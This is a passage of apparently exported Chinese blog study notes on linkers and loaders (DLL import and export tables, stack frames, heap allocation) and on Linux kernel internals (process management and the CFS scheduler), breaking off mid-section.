<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619094010753-1388b44b-58df-4453-88d2-110c69e958a4.png" alt="img"></p>
<h5 id="c-怎么指定导出的符号"><a href="#c-怎么指定导出的符号" class="headerlink" title="c. 怎么指定导出的符号"></a>c. 怎么指定导出的符号</h5><ul>
<li><code>link Math.obj /DLL /EXPORT:Add</code> （会生成三个文件）</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619094061970-f06726fb-76b3-4e85-bd18-255ba04940e5.png" alt="img"></p>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619094414360-aefcbd62-619b-400b-9fc1-e6c72fe05224.png" alt="img"></p>
<h4 id="9-2-2-EXP-文件产生的原因"><a href="#9-2-2-EXP-文件产生的原因" class="headerlink" title="9.2.2 EXP 文件产生的原因"></a>9.2.2 EXP 文件产生的原因</h4><ul>
<li><p>链接器创建 DLL 时与静态链接一样采用两遍扫描过程：</p>
</li>
<li><p>第一遍：遍历所有目标文件并收集所有导出符号信息，创建 DLL 导出表。链接器把导出表放到创建 DLL 时产生的临时文件 EXP 中</p>
</li>
<li>第二遍：链接器把 EXP 和其他输入的目标文件链接在一起并输出 DLL</li>
</ul>
<h4 id="9-2-3-导入表"><a href="#9-2-3-导入表" class="headerlink" title="9.2.3 导入表"></a>9.2.3 导入表</h4><ul>
<li><code>dumpbin /IMPORTS Math.dll</code> 查看导入了哪些函数</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619095216680-6c57a4fd-d8b1-4a69-bbe8-8ef4ec9ff4c8.png" alt="img"></p>
<ul>
<li><p>结构</p>
</li>
<li><p>FirstThunk 指向导入地址数组 IAT</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;</span><br><span class="line">    union &#123;</span><br><span class="line">        DWORD   Characteristics;            // 0 for terminating null import descriptor</span><br><span class="line">        DWORD   OriginalFirstThunk;         // RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  // 0 if not bound,</span><br><span class="line">                                            // -1 if bound, and real date\time stamp</span><br><span class="line">                                            //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span><br><span class="line">                                            // O.W. date/time stamp of DLL bound to (Old BIND)</span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 // -1 if no forwarders</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     // RVA to IAT (if bound this IAT has actual addresses)</span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>
<h3 id="9-3-DLL-优化"><a href="#9-3-DLL-优化" class="headerlink" title="9.3 DLL 优化"></a>9.3 DLL 优化</h3><ul>
<li>重定及地址（Rebasing）</li>
<li><p>使用序号导入（只比函数名导入快一点点，另外，Windows API 的导入不能用序号，因为不同版本中函数名不变但序号是不断变化的）</p>
</li>
<li><p>DLL 绑定（导出函数地址保存到导入表）</p>
</li>
</ul>
<h3 id="9-4-C-与动态链接"><a href="#9-4-C-与动态链接" class="headerlink" title="9.4 C++ 与动态链接"></a>9.4 C++ 与动态链接</h3><p>使用 C++ 写动态链接库时，需要注意：</p>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619096253652-42f71892-2225-4d6b-a3a2-67e6886b7d51.png" alt="img"></p>
<h2 id="第四部分-库与运行库"><a href="#第四部分-库与运行库" class="headerlink" title="第四部分 库与运行库"></a>第四部分 库与运行库</h2><h2 id="第十章-内存"><a href="#第十章-内存" class="headerlink" title="第十章 内存"></a>第十章 内存</h2><h3 id="10-1-Linux-下进程地址空间布局"><a href="#10-1-Linux-下进程地址空间布局" class="headerlink" title="10.1 Linux 下进程地址空间布局"></a>10.1 Linux 下进程地址空间布局</h3><ul>
<li>其中动态链接库映射区，用于映射装载的动态链接库。在 Linux 中，如果可执行文件依赖其他共享库，系统就会在 0x40000000 开始处分配相应的空间，将共享库载入该空间</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619167570197-e21929bd-23f3-40b3-9b38-01a078bdb788.png" alt="img"></p>
<h4 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h4><ul>
<li>Q: 程序出现“段错误（segment fault）”或者“非法操作，该内存地址不能 read/write”的原因</li>
<li><p>A: 这时典型的非法指针解引用造成的错误。最普遍的原因有两种</p>
</li>
<li><p>程序员将指针初始化为 NULL，之后没有给一个合理的值就开始使用</p>
</li>
<li>程序员没有初始化栈上的指针，指针的值一般会是随机数，之后就直接开始使用</li>
</ul>
<ul>
<li>Q: 堆总是向上增长吗？</li>
<li>A: 不是，Windows 里大部分堆使用 HeapCreate 产生，其不遵循向上增长这个规律。</li>
</ul>
<h3 id="10-2-栈与调用惯例"><a href="#10-2-栈与调用惯例" class="headerlink" title="10.2 栈与调用惯例"></a>10.2 栈与调用惯例</h3><h4 id="10-2-1-栈和堆栈帧"><a href="#10-2-1-栈和堆栈帧" class="headerlink" title="10.2.1 栈和堆栈帧"></a>10.2.1 栈和堆栈帧</h4><ul>
<li><strong>栈</strong>是向下（低地址）增长的，栈顶由 esp 寄存器进行定位。压栈使栈顶地址减小，弹出使栈顶地址增大。</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619169270677-d5a32c6e-fbe0-4b51-8389-7f0c54e1a248.png" alt="img"></p>
<ul>
<li>栈保存了一个函数调用所需的维护信息：<strong>堆栈帧</strong>（或<strong>活动记录</strong>）</li>
</ul>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619169442560-7ceae2a4-c77e-4147-8c65-7fabad39cce1.png" alt="img"></p>
<h4 id="10-2-2-反汇编示例"><a href="#10-2-2-反汇编示例" class="headerlink" title="10.2.2 反汇编示例"></a>10.2.2 反汇编示例</h4><ul>
<li>示例代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int foo()</span><br><span class="line">&#123;</span><br><span class="line">    return 123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619169584780-ca3eff52-29ad-418a-9370-c58aad69e6f6.png" alt="img"></p>
<h4 id="10-2-3-烫烫烫烫"><a href="#10-2-3-烫烫烫烫" class="headerlink" title="10.2.3 烫烫烫烫.."></a>10.2.3 烫烫烫烫..</h4><ul>
<li><p>Q：为什么常看到一些没有初始化的变量或内存区域的值是“烫”？</p>
</li>
<li><p>示例代码</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	char p[12];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>加断点调试监视 p 的数据，会发现  </p>
<p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619170073349-5f03b8c4-aa2f-41a7-9574-7f47c3757542.png" alt="img"></p>
<ul>
<li>A：因为加入调试信息时，会将所有分配出来的栈空间的每个字节都初始化为 0xCC，两个连续排列的 0xCC 的汉字编码就是烫。</li>
</ul>
<p>这仅作为变量是否已经初始化的<strong>参考</strong>，并不能以此为证据，有的编译器会使用 0xCDCDCDCDCD 作为未初始化标记，这时会看到汉字 屯屯</p>
<h4 id="10-2-4-mov-edi-edi"><a href="#10-2-4-mov-edi-edi" class="headerlink" title="10.2.4 mov edi, edi"></a>10.2.4 mov edi, edi</h4><ul>
<li>在 Windows 的函数里，有些函数尽管使用标准的进入指令序列，但在这些指令之前却插入了一些特殊内容：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov edi, edi</span><br></pre></td></tr></table></figure>
<p>这条指令暂时没有什么用处，在汇编之后会变成一个占用两个字节的机器码，纯粹为占位而存在。出于某些目的（如 Hook 技术），可以将占用两个字节的 <code>mov edi, edi</code> 指令替换成另一个 jmp 指令，原函数的调用就会被转换为新函数的调用。</p>
<h4 id="10-2-5-调用惯例"><a href="#10-2-5-调用惯例" class="headerlink" title="10.2.5 调用惯例"></a>10.2.5 调用惯例</h4><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1619358420401-e7a9608f-ef7f-4974-9a43-15201919d152.png" alt="img"></p>
<h3 id="10-3-堆"><a href="#10-3-堆" class="headerlink" title="10.3 堆"></a>10.3 堆</h3><h4 id="10-3-1-malloc-怎么实现的"><a href="#10-3-1-malloc-怎么实现的" class="headerlink" title="10.3.1 malloc 怎么实现的"></a>10.3.1 malloc 怎么实现的</h4><p>程序向操作系统申请一块适当大小的堆空间，然后由程序自己管理这块空间，具体来讲，管理堆空间分配的往往是程序的运行库</p>
<ul>
<li>Q: malloc 申请的内存，进程结束后还会存在吗？</li>
<li>A: 不会，进程结束后，会被操作系统关闭或回收。</li>
</ul>
<ul>
<li><p>Q: malloc 申请的空间是连续的吗？</p>
</li>
<li><p>A: 虚拟空间是连续的，物理空间不一定连续。</p>
</li>
</ul>
<h4 id="10-3-2-Linux-进程堆管理"><a href="#10-3-2-Linux-进程堆管理" class="headerlink" title="10.3.2 Linux 进程堆管理"></a>10.3.2 Linux 进程堆管理</h4><p>Linux 下的进程管理稍微复杂些，它提供了两种堆空间分配方式，即两个系统调用：</p>
<ul>
<li><code>brk()</code>系统调用：设置进程数据段的结束地址</li>
<li><code>mmap()</code> 的作用和 Windows 下的 VirtualAlloc 很相似：向系统申请一段虚拟地址空间</li>
</ul>
<h4 id="10-3-3-Windows-进程堆管理"><a href="#10-3-3-Windows-进程堆管理" class="headerlink" title="10.3.3 Windows 进程堆管理"></a>10.3.3 Windows 进程堆管理</h4><ul>
<li><code>VirtualAlloc()</code></li>
</ul>
<p>首先通过 <code>VirtualAlloc()</code> 向系统一次性批发大量空间，然后根据需要分配给程序</p>
<p>分配算法位于 <strong>堆管理器（Heap manager）</strong>，堆管理器提供了 API：</p>
<ul>
<li>HeapCreate</li>
<li><p>HeapAlloc</p>
</li>
<li><p>HeapFree</p>
</li>
<li>HeapDestroy</li>
</ul>
<h4 id="10-3-4-堆分配算法"><a href="#10-3-4-堆分配算法" class="headerlink" title="10.3.4 堆分配算法"></a>10.3.4 堆分配算法</h4><p>最基本的是空闲链表和位图</p>
<h5 id="a-空闲链表-（Free-List）"><a href="#a-空闲链表-（Free-List）" class="headerlink" title="a. 空闲链表 （Free List）"></a>a. 空闲链表 （Free List）</h5><ul>
<li><strong>概念：</strong>把堆中空闲块按链表的方式连接起来。用户请求一块空间时，遍历，找到合适大小的块并将它拆分；用户释放空间时把它合并到空闲链表中。</li>
<li><p><strong>优点：</strong>实现简单</p>
</li>
<li><p><strong>弊端：</strong>一旦链表被破坏，或者记录长度的四个字节被破坏，整个堆就无法工作。而这些数据恰巧很容易被越界读写接触到。</p>
</li>
</ul>
<h5 id="b-位图-（Bitmap）"><a href="#b-位图-（Bitmap）" class="headerlink" title="b. 位图 （Bitmap）"></a>b. 位图 （Bitmap）</h5><ul>
<li><strong>概念：</strong>把整个堆划分成大量的<strong>块</strong>（block），每个块大小相同。当用户请求内存时，总是分配整数个块给用户，第一个块作为已分配区域的<strong>头（Head）</strong>，其余的作为<strong>主体（Body）</strong>。我们可以用一个整数数组记录块的使用情况，每个块只有 <strong>头、主体、空闲</strong> 三种状态，所以可以用两位表示状态，所以称为位图</li>
<li><p><strong>优点：</strong>快、稳定、易于管理</p>
</li>
<li><p><strong>弊端：</strong></p>
</li>
<li><p>分配内存时容易产生碎片</p>
</li>
<li>堆很大或者块很小时，位图就会很大，可能失去 cache 命中率高的优势，而且会浪费一定的空间。（针对这种情况可以用多级位图）</li>
</ul>
<h5 id="c-对象池"><a href="#c-对象池" class="headerlink" title="c. 对象池"></a>c. 对象池</h5><ul>
<li><strong>使用场景：</strong>被分配对象的大小是较为<strong>固定</strong>的几个值</li>
<li><strong>概念：</strong>如果每次分配空间大小都一样，那就可以按这个大小作为单位，把整个堆空间划分成大量的小块，每次请求只要找一小块。</li>
</ul>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>计算机理论</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核设计与实现[笔记]</title>
    <url>/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="第-1-章-Linux-内核简介"><a href="#第-1-章-Linux-内核简介" class="headerlink" title="第 1 章 - Linux 内核简介"></a>第 1 章 - Linux 内核简介</h2><h3 id="1-1-单内核与微内核"><a href="#1-1-单内核与微内核" class="headerlink" title="1.1 单内核与微内核"></a>1.1 单内核与微内核</h3><div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>概念</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody>
<tr>
<td>单内核</td>
<td>所有内核服务在一个大内核地址空间运行</td>
<td>1. 简单<br>2. 高效（内核之间的通信没什么开销，内核可以直接调用函数）</td>
<td>可用性不好（一个服务影响其他服务）</td>
</tr>
<tr>
<td>微内核</td>
<td>1. 微内核的功能被划分成多个独立过程<br>2. 所有过程运行在自己的地址空间。</td>
<td>1. 可用性高（一个服务失效并不影响其他服务）<br>2. 模块化（互换服务）</td>
<td>消息传递开销大</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><p><strong>Linux 是单内核</strong>，但</p>
<ul>
<li><p>包含了<strong>微内核的精华</strong>：模块化 + 抢占式内核 + 内核线程 + 动态装载内核模块</p>
</li>
<li><p>避免了<strong>微内核的缺陷</strong>：所有事情运行在内核态，无需消息传递</p>
</li>
</ul>
</li>
</ul>
<h3 id="1-2-Linux-内核与传统-Unix-系统之间的差异"><a href="#1-2-Linux-内核与传统-Unix-系统之间的差异" class="headerlink" title="1.2 Linux 内核与传统 Unix 系统之间的差异"></a>1.2 Linux 内核与传统 Unix 系统之间的差异</h3><ul>
<li>Linux 支持动态加载内核模块</li>
<li>Linux 支持对称多处理机制（SMP）</li>
<li>Linux 内核支持抢占</li>
<li>Linux 内核不区分线程和其他的一般进程（对于内核来说，所有进程都一样，只不过是其中的一些共享资源而已）</li>
<li>Linux 提供了具有设备类的面向对象的设备模型、热插拔事件，以及用户空间的设备文件系统（sysfs）</li>
</ul>
<h3 id="1-3-Linux-内核版本"><a href="#1-3-Linux-内核版本" class="headerlink" title="1.3 Linux 内核版本"></a>1.3 Linux 内核版本</h3><script type="math/tex; mode=display">主版本号.从版本号.修订版本号.稳定版本号</script><p>由四个数字组成</p>
<ul>
<li>主版本号：<strong>偶数</strong>代表稳定版；<strong>奇数</strong>代表开发版</li>
<li>第四个数字可选，表示稳定版本号。包含了关键性 bug 的修改，是为了解决版本发布周期过长的副作用，更利于系统的稳定性。</li>
</ul>
<h2 id="第-2-章-从内核出发"><a href="#第-2-章-从内核出发" class="headerlink" title="第 2 章 - 从内核出发"></a>第 2 章 - 从内核出发</h2><h3 id="2-1-获取内核源码"><a href="#2-1-获取内核源码" class="headerlink" title="2.1 获取内核源码"></a>2.1 获取内核源码</h3><p><a href="https://www.kernel.org/">https://www.kernel.org/</a></p>
<p><a href="http://cdn.kernel.org/pub/linux/kernel/">旧版 Index of /pub/linux/kernel/</a> 这里下载 linux-2.6.26.tar.gz</p>
<font color="red">注意：内核源码一般安装在 `/usr/src/linux` ，应建立自己的主目录对内核进行修改然后用 root 身份安装，而不是以 root 身份对 `/usr/src/linux` 目录进行修改。</font>

<h3 id="2-2-内核源码树"><a href="#2-2-内核源码树" class="headerlink" title="2.2 内核源码树"></a>2.2 内核源码树</h3><div class="table-container">
<table>
<thead>
<tr>
<th>目录</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>arch</td>
<td>特定体系结构的源码</td>
</tr>
<tr>
<td>block</td>
<td>块设备 I/O 层</td>
</tr>
<tr>
<td>crypto</td>
<td>加密 API</td>
</tr>
<tr>
<td>Documentation</td>
<td>内核源码文档</td>
</tr>
<tr>
<td>drivers</td>
<td>设备驱动程序</td>
</tr>
<tr>
<td>firmware</td>
<td>设备驱动需要的设备固件</td>
</tr>
<tr>
<td>fs</td>
<td>文件系统</td>
</tr>
<tr>
<td>include</td>
<td>内核头文件</td>
</tr>
<tr>
<td>init</td>
<td>内核引导和初始化</td>
</tr>
<tr>
<td>ipc</td>
<td>进程间通信代码</td>
</tr>
<tr>
<td>kernel</td>
<td>核心子系统（如调度程序）</td>
</tr>
<tr>
<td>lib</td>
<td>通用内核函数</td>
</tr>
<tr>
<td>mm</td>
<td>内存管理子系统和 VM</td>
</tr>
<tr>
<td>net</td>
<td>网络子系统</td>
</tr>
<tr>
<td>samples</td>
<td>示范代码</td>
</tr>
<tr>
<td>scripts</td>
<td>编译内核所用的脚本</td>
</tr>
<tr>
<td>security</td>
<td>Linux 安全模块</td>
</tr>
<tr>
<td>sound</td>
<td>语音子系统</td>
</tr>
<tr>
<td>usr</td>
<td>早期用户空间代码</td>
</tr>
<tr>
<td>tools</td>
<td>Linux 开发工具</td>
</tr>
<tr>
<td>virt</td>
<td>虚拟化基础结构</td>
</tr>
</tbody>
</table>
</div>
<h3 id="2-3-编译内核"><a href="#2-3-编译内核" class="headerlink" title="2.3 编译内核"></a>2.3 编译内核</h3><ul>
<li><p>如何减少编译的垃圾信息？</p>
<p>将无用信息重定向到永无返回值的黑洞</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make &gt; /dev/null</span><br></pre></td></tr></table></figure>
<ul>
<li><p>以多个作业编译内核</p>
<p>n 代表要衍生的作业数，每个处理器一般衍生一个或两个作业。如在 16 核处理器上，可以 <code>make -j32</code></p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make -jn &gt; /dev/null</span><br></pre></td></tr></table></figure>
<h3 id="2-4-内核开发的特点"><a href="#2-4-内核开发的特点" class="headerlink" title="2.4 内核开发的特点"></a>2.4 内核开发的特点</h3><ol>
<li>内核编程时，不能访问 C 库，和标准的 C 头文件（因为效率低。不过大部分常用 C 库函数在内核都实现了）</li>
<li>必须使用 GNU C</li>
<li>没有内存保护机制</li>
<li>不使用浮点数运算</li>
<li>每个进程只有一个很小的定长堆栈</li>
<li>注意同步和并发（内核容易发生竞争，解决竞争：自旋锁和信号量）</li>
<li>注重可移植性</li>
</ol>
<h2 id="第-3-章-进程管理"><a href="#第-3-章-进程管理" class="headerlink" title="第 3 章 - 进程管理"></a>第 3 章 - 进程管理</h2><h3 id="3-1-进程（也即：任务-task）"><a href="#3-1-进程（也即：任务-task）" class="headerlink" title="3.1 进程（也即：任务 task）"></a>3.1 进程（也即：任务 task）</h3><p>进程的两种<strong>虚拟机制</strong>：<font color="blue">虚拟处理器</font>和<font color="blue">虚拟内存</font></p>
<ul>
<li>虚拟处理器：让进程觉得自己独享处理器</li>
<li>虚拟内存：让进程觉得自己拥有所有内存资源</li>
</ul>
<font color="red">注意：同一进程中的**线程**之间可以共享虚拟内存，但是每个都拥有自己的虚拟处理器</font>

<h3 id="3-2-进程描述符和任务结构"><a href="#3-2-进程描述符和任务结构" class="headerlink" title="3.2 进程描述符和任务结构"></a>3.2 进程描述符和任务结构</h3><h4 id="3-2-1-进程描述符的组成"><a href="#3-2-1-进程描述符的组成" class="headerlink" title="3.2.1 进程描述符的组成"></a>3.2.1 进程描述符的组成</h4><p>内核把<strong>进程列表</strong>存放在双向循环链表——<strong>任务队列</strong>中，链表每一项都是进程描述符的结构体 <code>task_struct</code> 。具体细节在 <code>linux-2.6.26/include/linux</code>/sched.h，进程描述符包含的数据有：</p>
<ul>
<li>打开的文件</li>
<li>进程的地址空间</li>
<li>挂起的信号</li>
<li>进程状态</li>
<li>进程间的关系等</li>
</ul>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210628230358383.png" alt="image-20210628230358383" style="zoom:80%;"></p>
<p>Linux 通过 slab 分配器分配 task_struct 结构。</p>
<h4 id="3-2-2-五种进程状态"><a href="#3-2-2-五种进程状态" class="headerlink" title="3.2.2 五种进程状态"></a>3.2.2 五种进程状态</h4><ul>
<li>TASK_RUNNING 运行</li>
<li>TASK_INTERRUPTIBLE 可中断</li>
<li>TASK_UNINTERRUPTIBLE  不可中断</li>
<li>__TASK_TRACED 被跟踪</li>
<li>__TASK_STOPPED 停止</li>
</ul>
<h4 id="3-2-3-进程家族树"><a href="#3-2-3-进程家族树" class="headerlink" title="3.2.3 进程家族树"></a>3.2.3 进程家族树</h4><ul>
<li>所有进程都是 PID 为 1 的 init 进程的后代。内核在系统启动的最后阶段启动 init 进程。</li>
</ul>
<h3 id="3-3-进程创建"><a href="#3-3-进程创建" class="headerlink" title="3.3 进程创建"></a>3.3 进程创建</h3><h4 id="3-3-1-主要函数"><a href="#3-3-1-主要函数" class="headerlink" title="3.3.1 主要函数"></a>3.3.1 主要函数</h4><ul>
<li><code>fork()</code>：拷贝当前进程创建一个子进程 </li>
<li><code>exec()</code>：读取可执行文件并将其载入地址空间开始执行</li>
</ul>
<hr>
<h5 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h5><ul>
<li><code>fork</code> 中的拷贝是写时拷贝：只有在需要写入时，数据才会被复制。（避免拷贝大量根本用不到的数据）</li>
<li><code>fork</code> 的实际开销：复制父进程的页表 + 给子进程创建唯一的进程描述符</li>
</ul>
<hr>
<h4 id="fork-的具体流程"><a href="#fork-的具体流程" class="headerlink" title="fork 的具体流程"></a>fork 的具体流程</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fork() 调用 clone()</span><br><span class="line">clone() 调用 do_fork()</span><br><span class="line">do_fork() 调用 copy_process()</span><br></pre></td></tr></table></figure>
<p> <code>copy_process()</code> 拷贝或共享打开的文件、文件系统信息、信号处理函数、进程地址空间、命名空间等。如果 <code>copy_process()</code> 成功返回，新创建的子进程被唤醒并投入使用。<font color="blue"><strong>内核首先执行子进程</strong></font>，因为一般子进程会立马调用 <code>exec()</code> ，这样可以<strong>避免写时复制的额外开销</strong>。（如果先执行父进程，有可能会开始向地址空间写入）</p>
<hr>
<h5 id="拓展-1"><a href="#拓展-1" class="headerlink" title="拓展"></a>拓展</h5><ul>
<li><code>vfork()</code> 与 <code>fork()</code> 的区别</li>
</ul>
<p><code>vfork()</code> 不拷贝父进程的页表项</p>
<hr>
<h3 id="3-4-Linux-的内核线程"><a href="#3-4-Linux-的内核线程" class="headerlink" title="3.4 Linux 的内核线程"></a>3.4 Linux 的内核线程</h3><ul>
<li><p>从内核角度看，并没有线程的概念，Linux 把所有的线程都当作进程实现。线程被视为一个与其他进程共享某些资源的进程。</p>
</li>
<li><p><font color="blue">内核线程与普通的进程间的区别</font>：内核线程没有独立的地址空间，只在内核空间运行，从不切换到用户空间。</p>
</li>
<li>内核进程和普通进程一样，可被调度，可被抢占。</li>
</ul>
<h3 id="3-5-进程的终止"><a href="#3-5-进程的终止" class="headerlink" title="3.5 进程的终止"></a>3.5 进程的终止</h3><p>大部分都要靠 <code>do_exit()</code> 完成，<code>do_exit()</code> 做了一系列工作以后调用 <code>schedule()</code> 切换到新的进程。然后与进程相关联的所有资源就都被释放掉了。但是进程本身占用的内存还需要等父进程释放。</p>
<p>注意：<font color="red">do_exit() 永不返回</font></p>
<h4 id="3-5-1-孤儿进程"><a href="#3-5-1-孤儿进程" class="headerlink" title="3.5.1 孤儿进程"></a>3.5.1 孤儿进程</h4><ul>
<li><p><strong>产生原因</strong>：父进程在子进程之前退出，就会产生孤儿进程。</p>
</li>
<li><p><strong>解决方法</strong>：给子进程在当前线程组找一个爹，找不到就让 init 进程做爹。然后再调用 <code>wait()</code> </p>
</li>
</ul>
<h2 id="第-4-章-进程调度"><a href="#第-4-章-进程调度" class="headerlink" title="第 4 章 - 进程调度"></a>第 4 章 - 进程调度</h2><p>进程调度的作用：决定在什么时间让什么进程运行。</p>
<h3 id="4-1-多任务系统"><a href="#4-1-多任务系统" class="headerlink" title="4.1 多任务系统"></a>4.1 多任务系统</h3><ul>
<li>非抢占式：除非自己停止，不然就一直执行。</li>
<li><strong>抢占式</strong>（绝大多数）：调度程序可以强制挂起一个程序，让其他程序执行。</li>
</ul>
<h3 id="4-2-调度策略"><a href="#4-2-调度策略" class="headerlink" title="4.2 调度策略"></a>4.2 调度策略</h3><p><strong>调度策略</strong>需要在进程响应迅速（<font color="blue">响应时间</font>）和最大系统利用率（<font color="blue">吞吐量</font>）之间寻找平衡。Linux 对进程响应做了优化（缩短响应时间），更倾向于优先调度 I/O 消耗型进程。</p>
<h4 id="4-2-1-基于优先级的调度"><a href="#4-2-1-基于优先级的调度" class="headerlink" title="4.2.1 基于优先级的调度"></a>4.2.1 基于优先级的调度</h4><h5 id="两种不同的优先级范围"><a href="#两种不同的优先级范围" class="headerlink" title="两种不同的优先级范围"></a>两种不同的优先级范围</h5><div class="table-container">
<table>
<thead>
<tr>
<th>度量方法</th>
<th>范围</th>
<th style="text-align:left">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>nice 值</td>
<td>[-20,19] 默认为 0</td>
<td style="text-align:left">1. nice 越低，优先级越高<br>2. 在 Linux 系统中，nice 值代表<strong>时间片</strong>的比例</td>
</tr>
<tr>
<td>实时优先级</td>
<td>[0,99]</td>
<td style="text-align:left">值最高，进程优先级越高</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>查看进程的 <font color="blue">nice 优先级（NI）</font> 和 <font color="blue">实时优先级（RTPRIO）</font>，<code>-</code> 表示不是实时进程</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -eo state,uid,pid,ppid,ni,rtprio,time,comm</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210629104007997.png" alt="image-20210629104007997" style="zoom:80%;"></p>
<h5 id="时间片的长与短"><a href="#时间片的长与短" class="headerlink" title="时间片的长与短"></a>时间片的长与短</h5><p>时间片是一个数值，表示进程被抢占前能持续运行的时间。</p>
<ul>
<li>过长：系统响应变慢</li>
<li>过短：增大进程切换导致的处理器耗时</li>
</ul>
<h3 id="4-3-Linux-调度算法"><a href="#4-3-Linux-调度算法" class="headerlink" title="4.3 Linux 调度算法"></a>4.3 Linux 调度算法</h3><h4 id="4-3-1-完全公平调度算法-CFS"><a href="#4-3-1-完全公平调度算法-CFS" class="headerlink" title="4.3.1 完全公平调度算法 CFS"></a>4.3.1 完全公平调度算法 CFS</h4><p>Completely Fair Scheduler，相关代码位于 <code>kernel/sched_fair.c</code> ，CFS 允许每个进程运行一段时间、循环轮转、选择运行最少的进程作为下一个运行进程。</p>
<h5 id="a-CFS-的公平体现在哪"><a href="#a-CFS-的公平体现在哪" class="headerlink" title="a. CFS 的公平体现在哪"></a>a. CFS 的公平体现在哪</h5><ul>
<li><font color="blue">CFS 确保给每个进程公平的处理器使用比。</font>（这个处理器使用比如何得到？<strong>nice 值</strong>：任何进程获得的处理器时间由自己和其他进程 nice 值得相对比例决定。nice 对应得时间不再是绝对值，而是处理器使用比）</li>
</ul>
<h5 id="b-CFS-的实现"><a href="#b-CFS-的实现" class="headerlink" title="b. CFS 的实现"></a>b. CFS 的实现</h5><script type="math/tex; mode=display">时间记账 + 进程选择 + 调度器入口 + 睡眠和唤醒</script><ol>
<li><p>时间记账 （<font color="blue">通过 <code>update_curr()</code> 更新 <code>vruntime</code> </font>）</p>
<p>虽然 CFS 没有时间片概念，但为了确保每个进程只在公平分配的处理器时间内运行，还是要维护每个进程运行的时间记账。CFS 通过<strong>调度器实体结构</strong> <code>sched_entity</code> 追踪进程运行记账。</p>
<ul>
<li>该结构体中有一个<strong>虚拟实时</strong>变量 <code>vruntime</code> 存放进程的<strong>虚拟运行时间</strong>。<font color="gray">CFS 使用 vruntime 记录一个程序运行了多长时间以及还要运行多久。</font></li>
</ul>
</li>
<li><p>进程选择</p>
<p><font color="blue">CFS 核心：选择 vruntime 最小的任务</font>。选择算法通过红黑树实现：运行红黑树最左边叶子节点代表的那个进程。具体实现在 <code>kernel/sched_fair.c</code> 的  <code>__pick_next_entity()</code> 函数。</p>
</li>
<li><p>调度器入口 <font color="blue">schedule()</font></p>
<p><code>schedule()</code> 函数会调用 <code>pick_next_task()</code> ，选择最高优先级的进程</p>
</li>
<li><p>睡眠和唤醒</p>
